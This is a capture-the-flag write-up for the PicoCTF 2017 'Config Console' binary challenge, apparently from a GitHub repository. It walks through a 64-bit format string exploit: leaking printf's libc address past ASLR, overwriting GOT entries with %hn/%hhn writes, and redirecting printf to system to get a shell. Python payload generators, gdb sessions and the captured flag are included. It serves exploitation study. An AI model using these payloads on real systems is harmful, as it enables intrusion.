# Config Console

```
In order to configure the login messsage for all the users on the system, you've been given access to a configuration console. See if you can get a shell on shell2017.picoctf.com:45115. console Source
HINTS
You can either see where libc is or modify the execution. Is there a way to get the vulnerability to run twice so that you can do both?
There's a place in libc that will give you a shell as soon as you jump to it. Try looking for execve.
```

This is a format String attack. If we look at the three functions that write to the log file... "One of these things is not like the other. Which one is different. Do you know..." [https://www.youtube.com/watch?v=ueZ6tvqhk8U](https://www.youtube.com/watch?v=ueZ6tvqhk8U)


```C
void set_login_message(char *message) {
    ...
    printf("Login message set!\n%s\n", message);
    ...
}

void set_exit_message(char *message) {
    ...
    printf(message);
    ...
}

void set_prompt(char *prompt) {
    ...
    printf("Login prompt set to: %10s\n", prompt);
    ...
}
```

It's the set_exit_message function. It directly prints a user string.

```C
printf(message)
```

This means that we can read data from the stack as we did in I've Got a Secret using format specifiers like ```%x```. But in order to affect program execution we're going to need to write values as well. ```printf()``` has a seemingly innocent format specifier ```%n``` that does just that. ```%n``` is supposed to write the number of characters already printed at the location of a pointer passed to ```printf()```. We're going to use it to write an arbitrary value to an arbitrary address, but there are 2 problems.
1. The program is 64 bit and there is no way we're going to be able to write values circa 2^63 by printing out that many characters. 
2. Our string must be fit in the 1024 byte buffer.
To solve problem one, we're going to write one byte at a time, the least significant byte of the length of the string. Thus we can write a larger value with many shorter writes. With regard to problem 2, we can use the ```%x``` format specifier with values before the x to pad the value with certain number of characters. This number is specified in decimal like so: ```%10x```. That will print the next element from the stack as a 4 byte hex value padded to be 10 characters long. Since we put nothing before the first nonzero integer after the % it will pad with spaces.

There is a third problem that many will fear when dealing with a 64 bit format string attack: null address bytes. This is not a concern in this problem because ```fgets()``` is used to put the value on the stack, not a string library function in the loop function. We had though for a few days that the value placed onto the stack could not contain null bytes and this is simply not the case. ```fgets()``` does not null terminate.

We have the capability to write arbitrary data to arbitrary addresses. So what? Well, let's craft a plan.

We want to get a shell. Looking at the hints they advise that we jump somewhere in libc and tell us to consider ```execve()```. We think this was a cruel thing to tell us to do as execve takes multiple arguments and is no easier to locate than ```system()```. It is a system call, however, and would be more applicable to Return Oriented Programming (ROP) problems. That being said, ROP is not required for this attack. Instead we will try to get the program to execute ```system("/bin/sh")```. 

We can do this by hijacking a function that is called with one argument to call ```system()``` with that argument. We'll use the very same ```printf()``` call that we are exploiting to read and write arbitrary data. An easy way to do this is to overwrite the Global Offset Table (GOT) entry for that function with the address of the ```system()``` function. But how do we find the location of ```system()```. If ```system()``` was used in the program and it was dynamically linked, there would be a GOT entry for it and this would be easy. Just copy the GOT entry for ```system()``` into the GOT entry ```printf()``` and we're done. However, ```system()``` is not called at all in this program so we will have to leak its location somehow. Oh, we can just run the program in gdb and print the location of ```system()```. Wrong.

But it looks like it doesn't change between executions. How is that not a valid approach?

```
Config action: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b0cba0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
81      ../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) p system
$1 = {<text variable, no debug info>} 0x7ffff7a72490 <__libc_system>
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/robbie/PicoCTF2017/binary_exploitation/level3/config_console/console log
Config action: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b0cba0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
81      ../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) p system
$2 = {<text variable, no debug info>} 0x7ffff7a72490 <__libc_system>
(gdb)
```

The answer is a pwner's worst enemy, ASLR or Address Space Layout Randomization. ASLR randomly selects a location in memory to load libc and other library functions to prevent just the type of attack that we are attempting. We can illustrate this by either turning ASLR on in gdb or attaching gdb to the process multiple times when running it normally. ASLR is off by default in gdb. We'll just enable it real quick. Making sure it isn't disabled system wide is also important. You may find these 2 stack exchange threads relevant.

[http://stackoverflow.com/questions/10061475/difference-between-gdb-addresses-and-real-addresses](http://stackoverflow.com/questions/10061475/difference-between-gdb-addresses-and-real-addresses)
[https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization](https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization)

The 2 in the thread didn't seem to work right for us after we had previously disabled ASLR system wide. We used a 1 to turn it back on instead.

```
echo 1 | sudo tee /proc/sys/kernel/randomize_va_space
```

The throes of ASLR prevent us from just getting the address of a crucial libc function that easily.

```
$ gdb console -q
Reading symbols from console...(no debugging symbols found)...done.
(gdb) set disable-randomization off
(gdb) r log
Starting program: /home/robbie/PicoCTF2017/binary_exploitation/level3/config_console/console log
Config action: ^C
Program received signal SIGINT, Interrupt.
0x00007f4389eacba0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
81      ../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) p system
$1 = {<text variable, no debug info>} 0x7f4389e12490 <__libc_system>
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/robbie/PicoCTF2017/binary_exploitation/level3/config_console/console log
Config action: ^C
Program received signal SIGINT, Interrupt.
0x00007fb1d2bdeba0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
81      ../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) p system
$2 = {<text variable, no debug info>} 0x7fb1d2b44490 <__libc_system>
(gdb)
```

So what can we do? Well the ```%s``` format specifier is the other holy grail of format string attacks. It prints a string of characters at the address of a ```char*``` type passed into it. If we give it an arbitrary pointer, it will print out the data as ASCII characters until it hits a null byte. Thus, can craft a format string to leak the value held at an arbitrary address. We will use this capability to leak the value of the GOT pointer for ```printf()```. 

One thing that does remain the same between runs of the program for a given version of the libc library is the offset between ```system()``` and ```printf()```. We can use this fact to calculate the address of ```system()``` based on the leaked runtime address of ```printf()``` from a format string, but now we have to do 2 things. We have to both leak the address of the ```printf()``` function and overwrite its GOT entry with the address of ```system()```. The program exits after the first call to a function that writes to the log file.

This brings us to the second hint, redirecting the program execution to do get the vulnerability to run multiple times. To do this we overwrite the GOT entry of exit with a call to the loop function. We can find both these addresses in gdb. They will not change due to ASLR because they are statically linked in the program. While we're at it, we can also test our exploit synthetically by changing the values of these addresses in gdb.

```
$ gdb console -q
Reading symbols from console...(no debugging symbols found)...done.
(gdb) p exit
$1 = {<text variable, no debug info>} 0x400730 <exit@plt>
(gdb) disassemble 0x400730
Dump of assembler code for function exit@plt:
   0x0000000000400730 <+0>:     jmpq   *0x200b22(%rip)        # 0x601258 <exit@got.plt>
   0x0000000000400736 <+6>:     pushq  $0xa
   0x000000000040073b <+11>:    jmpq   0x400680
End of assembler dump.
(gdb) p loop
$2 = {<text variable, no debug info>} 0x4009bd <loop>
(gdb) r log
Starting program: /home/robbie/PicoCTF2017/binary_exploitation/level3/config_console/console log
Config action: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b0cba0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
81      ../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) set {int}0x601258=0x4009bd
(gdb) c
Continuing.
e asdf
Exit message set!
asdfConfig action: e asdf
Exit message set!
asdfConfig action:
```

As you can see, we have managed to force the vulnerability to run multiple times. While we're here, let's also overwrite the GOT entry for ```printf()``` with ```system()``` and see if we can get a shell. Note that we will have to do 2 separate 4 byte writes to write the 64 bit pointer to ```system()``` into the GOT entry.

```
Program received signal SIGINT, Interrupt.
0x00007ffff7b0cba0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
81      in ../sysdeps/unix/syscall-template.S
(gdb) p system
$3 = {<text variable, no debug info>} 0x7ffff7a72490 <__libc_system>
(gdb) set {int}0x601224=0x007fff
(gdb) set {int}0x601220=0xf7a72490
(gdb) c
Continuing.
e /bin/sh
Exit message set!
$ ls
calc_system_fmt_str.py  compile_input.sh  config-console_modified.c  flag.txt  hex    input.py  old  printf_locations  shell    test    test32.c
calc_system.py          config-console.c  console                    hack.txt  input  log       out  README.md         shell.c  test32  test.c
$
```

So there we have validation of our plan. Those who have done this problem or read the source might notice that it would also be possible to overwrite the GOT entry for ```strtok``` so that we wouldn't have to enter ```e /bin/sh```, but simply ```/bin/sh``` to execute ```system("/bin/sh")```. Then the program wouldn't have to forfeit its ability to print to the console, but our approach works nonetheless.

Now we have to craft format strings to do this task. We use the python script ```input.py``` to redirect call to ```exit()```  and leak the GOT address of ```printf()```.

First we import necessary libraries for packing hex values into strings and define relevant constants gleaned from our adventures in gdb.

```Python
import struct

LOOP = 0x4009bd
EXIT_GOT = 0x601258
PRINTF_GOT = 0x601220
```

Then we craft a format string to put EXIT and the 7 addresses above it on the stack starting at the 17th index and ending at the 24th. This ended up not being necessary for the overwriting the exit entry but having the ability to independently edit bytes is required to edit the ```printf()``` GOT entry.

```Python
# put address of EXIT_GOT on stack
exploit = ""
exploit += "AAAABBBBCCCCDDDDEEEEFFFF"

#17$->24$
for i in range(0, 8, 1):
    exploit += struct.pack("Q", EXIT_GOT + i);
```

Then we write a pointer to ```loop()``` to the GOT entry. The ```%hn``` specifier simply writes a 2 byte integer instead of a 4 byte one. Likewise ```%hhn``` would write a single byte. The 3rd through 8th bytes of the pointer were already in order, so we did not bother to write over them. 

```Python
# write to exit got entry the value of loop pointer
exploit += "\ne "
exploit += "%2493x%17$hn"
```

Now we add more padding and write the relevant bytes for the GOT entry of ```printf()``` to the stack.

```Python
# prep for leak of printf addr
exploit += "\n" + "AAAABBBBCCCCDDDDEEEEFFFF"*8
for i in range(0, 12, 1):
    exploit += struct.pack("Q", PRINTF_GOT + i - 4);
```

Finally we get to leak the runtime address of ```printf()``` with the ```%s``` specifier.

```Python
# leak addr of printf to console
exploit += "\ne "
for i in range(0, 8):
    exploit += "%"+str(i+39)+"$s,"
exploit += "\n"
```

Now we put the GOT address of ```printf()``` on the stack a little bit higher to protect it from tampering, and print the result. If someone has an explanation as to why our writes affect the stack values, that would be awesome. Please do contact us.

```Python
# prep for overwrite of printf (starts at $51 for printf got addr)
exploit += "AAAABBBBCCCCDDDDEEEEFFFFGGGG"*10
for i in range(0, 10):
    exploit += struct.pack("Q", PRINTF_GOT + i - 2)

exploit += "\n"

print exploit
```

This script's output was piped in to do all of the aforementioned steps as follows.


```
$ (python input.py; cat) | nc shell2017.picoctf.com 45115
...
Config action: Exit message set!
,,,▒<̈,<̈,̈,▒,,Config action: Command unrecognized.
You can:
...
```

Despite our efforts, the address of ```printf()``` appears to be a bunch of gibberish instead of a valid libc address when converted to hex values in [rapid tables](http://www.rapidtables.com/convert/number/ascii-to-hex.htm).

```
▒<̈
2592 3c 308
```

The reason for this is that its address contains some unprintable characters as well as some null bytes that will not be printed by ```%s```. We can solve this by tee'ing that output to a file and piping its contents into xxd, and tee'ing it to another file that will contain the hex values of these characters in a nicer format. This is done like so. Note that you will need 2 terminal windows to pull off this hack.

In terminal 1:

```
$ (python input.py; cat) | nc shell2017.picoctf.com | out.txt
/bin/sh: 3: out.txt: not found
no port[s] to connect to
^C$ (python input.py; cat) | nc shell2017.picoctf.com 45115 | out.txt
/bin/sh: 4: out.txt: not found
^C$ (python input.py; cat) | nc shell2017.picoctf.com 45115 | tee out.txt
Config action: Command unrecognized.
You can:
    login <login-message>    set the login message
    exit <exit-message>      set the exit message
    prompt <prompt>          set the command prompt
Config action: Exit message set!
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      a9e3323Config action: Command unrecognized.
You can:
    login <login-message>    set the login message
    exit <exit-message>      set the exit message
    prompt <prompt>          set the command prompt
Config action: Exit message set!
,,,▒▒h
,▒h
,h
,
,,Config action: Command unrecognized.
You can:
    login <login-message>    set the login message
    exit <exit-message>      set the exit message
    prompt <prompt>          set the command prompt
Config action: Command unrecognized.
You can:
    login <login-message>    set the login message
    exit <exit-message>      set the exit message
    prompt <prompt>          set the command prompt
Config action:

```

In Terminal 2:

```
$ cat out.txt | xxd | tee hex.txt
0000000: 436f 6e66 6967 2061 6374 696f 6e3a 2043  Config action: C
0000010: 6f6d 6d61 6e64 2075 6e72 6563 6f67 6e69  ommand unrecogni
...
...
0000b80: 6d65 7373 6167 6520 7365 7421 0a7f 2c2c  message set!..,,
0000b90: 2cf0 ec05 9cb3 7f2c ec05 9cb3 7f2c 059c  ,......,.....,..
0000ba0: b37f 2c9c b37f 2cb3 7f2c 436f 6e66 6967  ..,...,..,Config
...
$
```

Now we have the hex value for the location of ```printf()```. It should be between 2 comma's, hex value 0x2c, and should be between 4 and 6 bytes long. Any missing bytes are null bytes. We just need to convert it to big endian and add relevant null bytes if applicable. For this run the following values are acquired.

Address in Little Endian from the hex.txt file:
```
f0 ec05 9cb3 7f
```
As a big endian hex value:
```
0x7fb39c05ecf0
```

The address contains 6 bytes. 64 bit programs only use 48 bit addresses at the current time, so the other 2 bytes are guaranteed to be zeros. We will write them anyway. Now we used the following python script to calculate a format string that will overwrite address of ```system()``` using the relevant offset and location of ```printf()```. It is explained below.

First we import the struct library again and sys to take command line arguments.

```Python
import sys
import struct
```

Then we get the address of ```printf()``` as a hex value from command line args and calculate the address of ```system()``` with our known offset.

```Python
# input printf addr as arg 1
printf = int(sys.argv[1], 16)

# calc system addr from known prinf addr (0xf860 is magical constant from shell2017.picoctf.com)
system = printf - 0xf860
```

Note: the offset can be found in gdb with the assistance of python as a calculator by doing the following:

```
$ gdb console -q
Reading symbols from console...(no debugging symbols found)...done.
(gdb) r log
Starting program: /home/robbie/Documents/CTF/PicoCTF2017/binary_exploitation/level3/config_console/console log
Config action: ^C
Program received signal SIGINT, Interrupt.
0x00007ffff7b0cba0 in __read_nocancel ()
    at ../sysdeps/unix/syscall-template.S:81
81      ../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) p system
$1 = {<text variable, no debug info>} 0x7ffff7a72490 <__libc_system>
(gdb) p printf
$2 = {<text variable, no debug info>} 0x7ffff7a81cf0 <__printf>
(gdb) q
```

Now for a quick calculation which shows us that ```system()``` is 0xf860 behind ```printf()```; thus, we will subtract the positive value that results from the leaked address of ```printf()```.

```
$ python
Python 2.7.9 (default, Jun 29 2016, 13:08:31)
[GCC 4.9.2] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> hex(0x7ffff7a81cf0 - 0x7ffff7a72490)
'0xf860'
>>>
```

Then we create a format string which performs 8 writes. Each one writes the least significant byte of the string's length to a portion of the GOT entry for ```printf()``` to build the address of ```system()``` at that location. 

```Python
fmt_str = "\ne "
count = 0x0
add = 0x0
for i in range(0, 8, 1):
    # get byte from system addr
    byte = (system >> (8 * i)) % 256
    # calc num chars to add to str
    add = byte - count % 256
    if add <= 0:
        add += 256
    count += add
    # append to format str (51 is magic number from input.py script)
    fmt_str += "%"+str(add)+"x%"+str(51+i)+"$hhn"
fmt_str += "\n"

print fmt_str
```

So we run that script as follows and get the format string we need to enter.

```
$ python calc_system_fmt_str.py 0x7fb39c05ecf0
e %144x%51$hhn%100x%52$hhn%16x%53$hhn%152x%54$hhn%23x%55$hhn%204x%56$hhn%129x%57$hhn%256x%58$hhn
$
```

Then in terminal 1 we finish the hack. We need only execute a shell with ```/bin/sh``` and cat the flag.

```
Config action: e %144x%51$hhn%100x%52$hhn%16x%53$hhn%152x%54$hhn%23x%55$hhn%204x%56$hhn%129x%57$hhn%256x%58$hhn
Exit message set!
                                                                                                                                        9c3b4323                                                                                            9c3b57a0        9c0e9c00                                                                                                                                                9c3b57a0               6e686824                                                                                                                                                                                                           0                                                                                                                         d04ca112                                                                                                                                                                                                                                                        d04ca520sh: 1: Config: not found
e /bin/sh
Exit message set!
ls
console
flag.txt
xinetd_wrapper.sh
cat flag.txt
e2d674ac146fc20d424c9c0d5e16760a
```

If you are interested in learning more about format string attacks check out our writeup for [Flagsay 2](https://github.com/MeadeRobert/PicoCTF2017/tree/master/binary_exploitation/level4/flagsay_2) or some of these links. They sure helped us out a lot.

[http://hamsa.cs.northwestern.edu/readings/format-strings/](http://hamsa.cs.northwestern.edu/readings/format-strings/)

[https://trailofbits.github.io/ctf/exploits/references/formatstring-1.2.pdf](https://trailofbits.github.io/ctf/exploits/references/formatstring-1.2.pdf)
